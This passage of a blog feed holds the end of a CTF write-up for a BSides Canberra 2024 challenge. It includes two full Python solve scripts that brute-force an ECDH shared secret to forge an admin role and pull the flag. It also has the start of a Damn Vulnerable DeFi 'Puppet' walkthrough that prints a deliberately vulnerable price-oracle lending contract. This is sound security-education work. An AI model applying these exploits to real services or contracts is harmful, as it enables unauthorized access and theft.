&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        role &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes_to_long(token&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; role &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; spb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ADMIN:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            msg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request_msg(s, sessionId, uid, ceph, sepk)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Got the flag: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;msg &lt;span style=&#34;color:#e6db74&#34;&gt;= }&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            exit()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After ~30 minutes and running multiple instances, we actually got the flag: &lt;code&gt;cybears{Wh1ch_pr0gr4m_d0_j3d1_us3_t0_op3n_PDF_f1l35?Ad0b3_W4n_K3n0b1!}&lt;/code&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/got_the_fricking_flag.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 70%&#34;  /&gt;


&lt;p&gt;Full solve script:



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;735682941&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;735682941&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;remote_brute.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
&amp;#39;&amp;#39;&amp;#39;

python3 client.py -r arpeeceethree.chal.cybears.io:2323



&amp;#39;&amp;#39;&amp;#39;

from pwn import * 
from google.protobuf.internal.encoder import _VarintEncoder
from google.protobuf.internal.decoder import _DecodeVarint
import server_pb2 as spb
from google.protobuf.internal.decoder import _DecodeError
import sys 
import argparse

import Crypto.Cipher.AES as AES
import Crypto.Hash.SHA512 as SHA512
from Crypto.Protocol.KDF import HKDF
from Crypto.Util.number import long_to_bytes, bytes_to_long

from ecdsa import ECDH, NIST256p, VerifyingKey



def send_message(s, msg):
    &amp;#34;&amp;#34;&amp;#34; Send a message, prefixed with its size, to a TPC/IP socket &amp;#34;&amp;#34;&amp;#34;
    data = msg.SerializeToString()
    mh = spb.MessageHeader()
    mh.msglen = len(data)
    mh.type = msg.type
    s.send(mh.SerializeToString() &amp;#43; data)
    return 

def msg_type(msgtype):
    if msgtype == spb.MSG_LOGIN_REQUEST:
        return spb.LoginRequest()
    elif msgtype == spb.MSG_LOGIN_RESPONSE:
        return spb.LoginResponse()
    elif msgtype == spb.MSG_LOGIN_CHALLENGE:
        return spb.LoginChallenge()
    elif msgtype == spb.MSG_LOGIN_CHALLENGE_RESPONSE:
        return spb.LoginChallengeResponse()
    elif msgtype == spb.MSG_REGISTER_REQUEST:
        return spb.RegisterRequest()
    elif msgtype == spb.MSG_REGISTER_RESPONSE:
        return spb.RegisterResponse()
    elif msgtype == spb.MSG_MESSAGE_REQUEST:
        return spb.MessageRequest()
    elif msgtype == spb.MSG_MESSAGE_RESPONSE:
        return spb.MessageResponse()
    else:
        return None


def check_fields(msg):
    result = True
    for field in msg.DESCRIPTOR.fields_by_name.keys():
        if msg.DESCRIPTOR.fields_by_name[field].label == msg.DESCRIPTOR.fields_by_name[field].LABEL_REQUIRED:
            result &amp;amp;= msg.HasField(field)
    return result

def recv_message(s):
    &amp;#34;&amp;#34;&amp;#34; Receive a message, prefixed with its size and type, from stdin &amp;#34;&amp;#34;&amp;#34;
    # Receive the size of the message data
    # expect [MessageHeader][Message of type]
    data = b&amp;#39;&amp;#39;
    header = spb.MessageHeader()
    while True:
        data&amp;#43;= s.recv(1)
        try:
            header.ParseFromString(data)
            if check_fields(header):
                break
        except _DecodeError as e:
            pass

    # Receive the message data
    data = s.recv(header.msglen)

    # Decode the message and validate all required fields are present
    msg = msg_type(header.type)
    if msg != None:
        try:
            msg.ParseFromString(data)
            if not check_fields(msg):
                return None
            return msg
        except _DecodeError:
            return None
    else:
        return None

def create_user():
    client_ecdh = ECDH(curve=NIST256p)
    client_ecdh.generate_private_key()
    return client_ecdh

def register(s, ecdh, name=b&amp;#39;bumblebear&amp;#39;, pubkey=b&amp;#39;&amp;#39;):
    ## REGISTER
    rr = spb.RegisterRequest()
    rr.type = spb.MSG_REGISTER_REQUEST
    rr.name = name
    if pubkey == b&amp;#39;&amp;#39;:
        rr.clientPublicKey = ecdh.get_public_key().to_string(encoding=&amp;#39;compressed&amp;#39;)
    else:
        rr.clientPublicKey = pubkey

    send_message(s, rr)

    ## REGISTER RESPONSE
    reg_resp = recv_message(s)
    if reg_resp != None:
        pass
        # log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(reg_resp))
    if reg_resp.status == spb.FAILURE:
        log.error(&amp;#34;failed to register&amp;#34;)
    uid = reg_resp.uid
    return uid

def login(s, uid):
    ## LOGIN
    l = spb.LoginRequest()
    l.type = spb.MSG_LOGIN_REQUEST
    l.uid = uid
    send_message(s, l)

    ## LOGIN RESPONSE
    login_resp = recv_message(s)
    if login_resp != None:
        pass
        # log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(login_resp))
    
    return login_resp.sessionId, login_resp.challenge, login_resp.ephemeralServerPublicKey


def login2(s, ecdh, sessionId, challenge):
    ## SIGN CHALLENGE
    sig = ecdh.private_key.sign_deterministic(challenge)

    ## GENERATE EPHEMERAL DH SESSION KEY
    client_ephemeral_ecdh = ECDH(curve=NIST256p)
    client_ephemeral_ecdh.generate_private_key()
    client_ephemeral_public_key = client_ephemeral_ecdh.get_public_key()

    send_chal = spb.LoginChallenge()
    send_chal.type = spb.MSG_LOGIN_CHALLENGE
    send_chal.sessionId = sessionId
    send_chal.ephemeralClientPublicKey = client_ephemeral_public_key.to_string(encoding=&amp;#39;compressed&amp;#39;)

    send_chal.challengeResponse = sig
    send_message(s, send_chal)

    msg_resp = recv_message(s)
    if msg_resp != None:
        pass
        # log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(msg_resp))

    return client_ephemeral_ecdh

def request_msg(s, sessionId, uid, client_ephemeral, server_ephemeral):
    ## REQUEST MESSAGE
    # log.info(&amp;#34;sending message request&amp;#34;)
    msg_req = spb.MessageRequest()
    msg_req.type = spb.MSG_MESSAGE_REQUEST
    msg_req.sessionId = sessionId

    send_message(s, msg_req)

    # log.info(&amp;#34;receiving message&amp;#34;)
    msg_resp = recv_message(s)
    if msg_resp != None:
        pass
        # log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(msg_resp))

    ## DECRYPT MESSAGE
    server_ephemeral_public_key = VerifyingKey.from_string(server_ephemeral, NIST256p)

    client_ephemeral.load_received_public_key(server_ephemeral_public_key)
    shared_secret = client_ephemeral.generate_sharedsecret_bytes()

    token  = shared_secret
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(spb.USER)
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(uid)
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; sessionId
    (aes_gcm_key, nonce) = HKDF(token, 16, &amp;#39;&amp;#39;, SHA512, num_keys=2)

    a = AES.new(aes_gcm_key, AES.MODE_GCM, nonce = nonce)
    message = a.decrypt_and_verify(msg_resp.encMsg, msg_resp.encMsgTag)

    # log.info(&amp;#34;message received: {}&amp;#34;.format(message))
    return message

from tqdm import tqdm

if __name__ == &amp;#34;__main__&amp;#34;:

    parser = argparse.ArgumentParser()
    parser.add_argument(&amp;#39;-r&amp;#39;, &amp;#39;--remote&amp;#39;, help=&amp;#34;The address:port of the remote server hosting the challenge&amp;#34;, required=True)
    args = parser.parse_args()

    if args.remote != None:
        host = args.remote.split(&amp;#34;:&amp;#34;)[0]
        port = int(args.remote.split(&amp;#34;:&amp;#34;)[1])
    else:
        exit(0)

    logging.root.setLevel(logging.ERROR)

    while True:
        s = remote(host, port)
        e = create_user()
        uid = register(s,e)
        for i in tqdm(range(0, 1000)):
            (sessionId, chal, sepk) = login(s, uid)
            ceph = login2(s, e, sessionId, chal)

            # calculate shared secret
            server_ephemeral_public_key = VerifyingKey.from_string(sepk, NIST256p)
            ceph.load_received_public_key(server_ephemeral_public_key)
            shared_secret = ceph.generate_sharedsecret_bytes()

            # if shared secret ends with |\x01 , request for the flag
            # (we aren&amp;#39;t explicitly checking for |\x01 because there is a chance
            # it could end with |\x00\x01 etc., which is still valid, slightly increasing
            # our chances)
            token  = shared_secret
            token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(spb.USER)
            role = bytes_to_long(token.split(b&amp;#39;|&amp;#39;)[1])
            if role == spb.ADMIN:
                msg = request_msg(s, sessionId, uid, ceph, sepk)
                print(f&amp;#34;Got the flag: {msg = }&amp;#34;)
                exit()
            else:
                continue

        s.close()


&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;

&lt;/p&gt;
&lt;h3 id=&#34;a-better-solution&#34;&gt;A better solution&lt;/h3&gt;
&lt;p&gt;Even though it worked, I thought that brute forcing on remote was probably unintended, and there should&amp;rsquo;ve been some way to brute force locally, but I couldn&amp;rsquo;t see how. Turns out my reading comprehension failed me again - I thought that the server uses the our public key we provided when registering to calculate the shared secret, but actually we provide it with another, ephemeral public key for the session when logging in.&lt;/p&gt;
&lt;p&gt;Since the server provides us with its ephermeral public key alongside the challenge, we can generate private keys and calculate the shared secret locally. If the shared secret ends with &lt;code&gt;|\x01&lt;/code&gt;, we use that public key and send it to the server, which should compute the same shared secret, and give us the flag. This way, we don&amp;rsquo;t need to brute force remote and can get the flag quickly in just one attempt.&lt;/p&gt;
&lt;p&gt;Better solve script:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;725439618&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;725439618&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;code.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
&amp;#39;&amp;#39;&amp;#39;

python3 client.py -r arpeeceethree.chal.cybears.io:2323



&amp;#39;&amp;#39;&amp;#39;

from pwn import * 
from google.protobuf.internal.encoder import _VarintEncoder
from google.protobuf.internal.decoder import _DecodeVarint
import server_pb2 as spb
from google.protobuf.internal.decoder import _DecodeError
import sys 
import argparse

import Crypto.Cipher.AES as AES
import Crypto.Hash.SHA512 as SHA512
from Crypto.Protocol.KDF import HKDF
from Crypto.Util.number import long_to_bytes, bytes_to_long

from ecdsa import ECDH, NIST256p, VerifyingKey



def send_message(s, msg):
    &amp;#34;&amp;#34;&amp;#34; Send a message, prefixed with its size, to a TPC/IP socket &amp;#34;&amp;#34;&amp;#34;
    data = msg.SerializeToString()
    mh = spb.MessageHeader()
    mh.msglen = len(data)
    mh.type = msg.type
    s.send(mh.SerializeToString() &amp;#43; data)
    return 

def msg_type(msgtype):
    if msgtype == spb.MSG_LOGIN_REQUEST:
        return spb.LoginRequest()
    elif msgtype == spb.MSG_LOGIN_RESPONSE:
        return spb.LoginResponse()
    elif msgtype == spb.MSG_LOGIN_CHALLENGE:
        return spb.LoginChallenge()
    elif msgtype == spb.MSG_LOGIN_CHALLENGE_RESPONSE:
        return spb.LoginChallengeResponse()
    elif msgtype == spb.MSG_REGISTER_REQUEST:
        return spb.RegisterRequest()
    elif msgtype == spb.MSG_REGISTER_RESPONSE:
        return spb.RegisterResponse()
    elif msgtype == spb.MSG_MESSAGE_REQUEST:
        return spb.MessageRequest()
    elif msgtype == spb.MSG_MESSAGE_RESPONSE:
        return spb.MessageResponse()
    else:
        return None


def check_fields(msg):
    result = True
    for field in msg.DESCRIPTOR.fields_by_name.keys():
        if msg.DESCRIPTOR.fields_by_name[field].label == msg.DESCRIPTOR.fields_by_name[field].LABEL_REQUIRED:
            result &amp;amp;= msg.HasField(field)
    return result

def recv_message(s):
    &amp;#34;&amp;#34;&amp;#34; Receive a message, prefixed with its size and type, from stdin &amp;#34;&amp;#34;&amp;#34;
    # Receive the size of the message data
    # expect [MessageHeader][Message of type]
    data = b&amp;#39;&amp;#39;
    header = spb.MessageHeader()
    while True:
        data&amp;#43;= s.recv(1)
        try:
            header.ParseFromString(data)
            if check_fields(header):
                break
        except _DecodeError as e:
            pass

    # Receive the message data
    data = s.recv(header.msglen)

    # Decode the message and validate all required fields are present
    msg = msg_type(header.type)
    if msg != None:
        try:
            msg.ParseFromString(data)
            if not check_fields(msg):
                return None
            return msg
        except _DecodeError:
            return None
    else:
        return None

def create_user():
    client_ecdh = ECDH(curve=NIST256p)
    client_ecdh.generate_private_key()
    return client_ecdh

def register(s, ecdh, name=b&amp;#39;bumblebear&amp;#39;, pubkey=b&amp;#39;&amp;#39;):
    ## REGISTER
    rr = spb.RegisterRequest()
    rr.type = spb.MSG_REGISTER_REQUEST
    rr.name = name
    if pubkey == b&amp;#39;&amp;#39;:
        rr.clientPublicKey = ecdh.get_public_key().to_string(encoding=&amp;#39;compressed&amp;#39;)
    else:
        rr.clientPublicKey = pubkey

    send_message(s, rr)

    ## REGISTER RESPONSE
    reg_resp = recv_message(s)
    if reg_resp != None:
        pass
        # log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(reg_resp))
    if reg_resp.status == spb.FAILURE:
        log.error(&amp;#34;failed to register&amp;#34;)
    uid = reg_resp.uid
    return uid

def login(s, uid):
    ## LOGIN
    l = spb.LoginRequest()
    l.type = spb.MSG_LOGIN_REQUEST
    l.uid = uid
    send_message(s, l)

    ## LOGIN RESPONSE
    login_resp = recv_message(s)
    if login_resp != None:
        pass
        # log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(login_resp))
    
    return login_resp.sessionId, login_resp.challenge, login_resp.ephemeralServerPublicKey


def login2(s, ecdh, ephemeral_ecdh, sessionId, challenge):
    ## SIGN CHALLENGE
    sig = ecdh.private_key.sign_deterministic(challenge)

    ## GENERATE EPHEMERAL DH SESSION KEY
    client_ephemeral_ecdh = ephemeral_ecdh
    client_ephemeral_public_key = client_ephemeral_ecdh.get_public_key()

    send_chal = spb.LoginChallenge()
    send_chal.type = spb.MSG_LOGIN_CHALLENGE
    send_chal.sessionId = sessionId
    send_chal.ephemeralClientPublicKey = client_ephemeral_public_key.to_string(encoding=&amp;#39;compressed&amp;#39;)

    send_chal.challengeResponse = sig
    send_message(s, send_chal)

    msg_resp = recv_message(s)
    if msg_resp != None:
        pass
        # log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(msg_resp))

    return client_ephemeral_ecdh

def request_msg(s, sessionId, uid, client_ephemeral, server_ephemeral):
    ## REQUEST MESSAGE
    # log.info(&amp;#34;sending message request&amp;#34;)
    msg_req = spb.MessageRequest()
    msg_req.type = spb.MSG_MESSAGE_REQUEST
    msg_req.sessionId = sessionId

    send_message(s, msg_req)

    # log.info(&amp;#34;receiving message&amp;#34;)
    msg_resp = recv_message(s)
    if msg_resp != None:
        pass
        # log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(msg_resp))

    ## DECRYPT MESSAGE
    server_ephemeral_public_key = VerifyingKey.from_string(server_ephemeral, NIST256p)

    client_ephemeral.load_received_public_key(server_ephemeral_public_key)
    shared_secret = client_ephemeral.generate_sharedsecret_bytes()

    token  = shared_secret
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(spb.USER)
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(uid)
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; sessionId
    (aes_gcm_key, nonce) = HKDF(token, 16, &amp;#39;&amp;#39;, SHA512, num_keys=2)

    a = AES.new(aes_gcm_key, AES.MODE_GCM, nonce = nonce)
    message = a.decrypt_and_verify(msg_resp.encMsg, msg_resp.encMsgTag)

    # log.info(&amp;#34;message received: {}&amp;#34;.format(message))
    return message

from tqdm import tqdm

if __name__ == &amp;#34;__main__&amp;#34;:

    parser = argparse.ArgumentParser()
    parser.add_argument(&amp;#39;-r&amp;#39;, &amp;#39;--remote&amp;#39;, help=&amp;#34;The address:port of the remote server hosting the challenge&amp;#34;, required=True)
    args = parser.parse_args()

    if args.remote != None:
        host = args.remote.split(&amp;#34;:&amp;#34;)[0]
        port = int(args.remote.split(&amp;#34;:&amp;#34;)[1])
    else:
        exit(0)

    logging.root.setLevel(logging.ERROR)

    s = remote(host, port)

    # register
    e = create_user()
    uid = register(s,e)

    # login step 1
    (sessionId, chal, sepk) = login(s, uid)
    server_ephemeral_ecdh_pubkey = VerifyingKey.from_string(sepk, NIST256p)

    # generate private keys until shared secret is what we want
    while True:
        client_ephemeral_ecdh = ECDH(curve=NIST256p)
        client_ephemeral_ecdh.generate_private_key()
        
        # calculate shared secret
        client_ephemeral_ecdh.load_received_public_key(server_ephemeral_ecdh_pubkey)
        shared_secret = client_ephemeral_ecdh.generate_sharedsecret_bytes()
        
        token = shared_secret
        token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(spb.USER)
        role = bytes_to_long(token.split(b&amp;#39;|&amp;#39;)[1])
        if role == spb.ADMIN:
            break

    login2(s, e, client_ephemeral_ecdh, sessionId, chal)
    
    msg = request_msg(s, sessionId, uid, client_ephemeral_ecdh, sepk)
    print(f&amp;#34;Got the flag: {msg = }&amp;#34;)



&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;BSides Canberra 2024 was again, a great conference, and &lt;a href=&#34;https://x.com/cybearsctf&#34;&gt;Cybears&lt;/a&gt; hosted another fun CTF! I believe it&amp;rsquo;s truely one of the best conferences out there, and I&amp;rsquo;ll definitely be coming back next year!&lt;/p&gt;
&lt;p&gt;I was able to attend thanks to the &lt;a href=&#34;https://www.bsidesau.com.au/assistance.html&#34;&gt;Assistance Program&lt;/a&gt;, which covered my flights and hotel, so special thanks to Kylie, Silvio and Danielle for making this possible!&lt;/p&gt;
&lt;p&gt;For coming 2nd place, we won $500, and a Dungeons and Dragons lego set! We, alongside the other winning teams, skateboarding dogs and French Roomba, all decided to donate our prize money to the Assistance Program, and we hope this helps other people attend the conference in the future! We&amp;rsquo;re keeping the lego set though :P&lt;/p&gt;
&lt;p&gt;Btw, if you spotted any errors/typos in the blog, or have questions, feel free to DM/ping me on discord &lt;code&gt;thesavageteddy&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Thanks for reading!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;teddy / TheSavageTeddy&lt;/li&gt;
&lt;/ul&gt;

  &lt;img src=&#34;./img/conference.jpg&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


</content>
    </item>
    
    <item>
      <title>Puppet Writeup - DamnVulnerableDefi V3</title>
      <link>https://TheSavageTeddy.github.io/posts/puppet-damnvulnerabledefi/</link>
      <pubDate>Tue, 13 Feb 2024 18:10:00 +0800</pubDate>
      
      <guid>https://TheSavageTeddy.github.io/posts/puppet-damnvulnerabledefi/</guid>
      <description>This post contains the walkthrough and solutions for Puppet, a challenge from the DamnVulnerableDefi wargame, featuring a price oracle manipulation vulnerability.
But wait, why another writeup? You may be wondering why Im making a writeup for this challenge, when there are already tons of other writeups online. Well, many of the writeups online don&amp;rsquo;t actually solve the challenge properly.
There was a new solve condition added in V3 of DamnVulnerableDefi, which required you, the attacker (player) to only make 1 transaction total.</description>
      <content>&lt;p&gt;This post contains the walkthrough and solutions for &lt;a href=&#34;https://www.damnvulnerabledefi.xyz/challenges/puppet/&#34;&gt;Puppet&lt;/a&gt;, a challenge from the &lt;a href=&#34;https://www.damnvulnerabledefi.xyz&#34;&gt;DamnVulnerableDefi&lt;/a&gt; wargame, featuring a price oracle manipulation vulnerability.&lt;/p&gt;
&lt;h4 id=&#34;but-wait-why-another-writeup&#34;&gt;But wait, why another writeup?&lt;/h4&gt;
&lt;p&gt;You may be wondering why Im making a writeup for this challenge, when there are already tons of other writeups online. Well, many of the writeups online &lt;strong&gt;don&amp;rsquo;t actually solve the challenge properly&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;There was a new solve condition added in V3 of DamnVulnerableDefi, which required you, the attacker (&lt;code&gt;player&lt;/code&gt;) to only make 1 transaction total.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;expect&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ethers&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;provider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getTransactionCount&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;)).&lt;span style=&#34;color:#a6e22e&#34;&gt;to&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;eq&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A lot of these online writeups didn&amp;rsquo;t account for this and hence made &lt;strong&gt;multiple transactions&lt;/strong&gt;. Their test script still shows that they passed the challenge, but this is because they might have simply created another account to run the attacks, or omitted &lt;code&gt;.connect(player)&lt;/code&gt; for some of the transactions, causing Hardhat to use the default account &lt;code&gt;deployer&lt;/code&gt;, both of which is not really solving the challenge properly.&lt;/p&gt;
&lt;p&gt;Executing the entire exploit in 1 transaction resulted in the challenge being a bit trickier, which we will explore in this post.&lt;/p&gt;
&lt;h1 id=&#34;challenge-overview&#34;&gt;Challenge Overview&lt;/h1&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Theres a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
&lt;br&gt;
&lt;br&gt;
Theres a DVT market opened in an old &lt;a href=&#34;https://docs.uniswap.org/contracts/v1/overview&#34;&gt;Uniswap v1 exchange&lt;/a&gt;, currently with 10 ETH and 10 DVT in liquidity.
&lt;br&gt;
&lt;br&gt;
Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given source code of the lending pool, the DVT, and the test file:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;solidity&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;PuppetPool.sol&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-solidity&#34; &gt;&lt;code&gt;
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import &amp;#34;@openzeppelin/contracts/security/ReentrancyGuard.sol&amp;#34;;
import &amp;#34;@openzeppelin/contracts/utils/Address.sol&amp;#34;;
import &amp;#34;../DamnValuableToken.sol&amp;#34;;

/**
 * @title PuppetPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract PuppetPool is ReentrancyGuard {
    using Address for address payable;

    uint256 public constant DEPOSIT_FACTOR = 2;

    address public immutable uniswapPair;
    DamnValuableToken public immutable token;

    mapping(address =&amp;gt; uint256) public deposits;

    error NotEnoughCollateral();
    error TransferFailed();

    event Borrowed(address indexed account, address recipient, uint256 depositRequired, uint256 borrowAmount);

    constructor(address tokenAddress, address uniswapPairAddress) {
        token = DamnValuableToken(tokenAddress);
        uniswapPair = uniswapPairAddress;
    }

    // Allows borrowing tokens by first depositing two times their value in ETH
    function borrow(uint256 amount, address recipient) external payable nonReentrant {
        uint256 depositRequired = calculateDepositRequired(amount);

        if (msg.value &amp;lt; depositRequired)
            revert NotEnoughCollateral();

        if (msg.value &amp;gt; depositRequired) {
            unchecked {
                payable(msg.sender).sendValue(msg.value - depositRequired);
            }
        }

        unchecked {
            deposits[msg.sender] &amp;#43;= depositRequired;
        }

        // Fails if the pool doesn&amp;#39;t have enough tokens in liquidity
        if(!token.transfer(recipient, amount))
            revert TransferFailed();

        emit Borrowed(msg.sender, recipient, depositRequired, amount);
    }

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
    }

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }
}
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;100&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;100&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;solidity&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;DamnValuableToken.sol&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-solidity&#34; &gt;&lt;code&gt;
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import &amp;#34;solmate/src/tokens/ERC20.sol&amp;#34;;

/**
 * @title DamnValuableToken
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract DamnValuableToken is ERC20 {
    constructor() ERC20(&amp;#34;DamnValuableToken&amp;#34;, &amp;#34;DVT&amp;#34;, 18) {
        _mint(msg.sender, type(uint256).max);
    }
}
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;javascript&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;puppet.challenge.js&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-javascript&#34; &gt;&lt;code&gt;
const exchangeJson = require(&amp;#34;../../build-uniswap-v1/UniswapV1Exchange.json&amp;#34;);
const factoryJson = require(&amp;#34;../../build-uniswap-v1/UniswapV1Factory.json&amp;#34;);

const { ethers } = require(&amp;#39;hardhat&amp;#39;);
const { expect } = require(&amp;#39;chai&amp;#39;);
const { setBalance } = require(&amp;#34;@nomicfoundation/hardhat-network-helpers&amp;#34;);

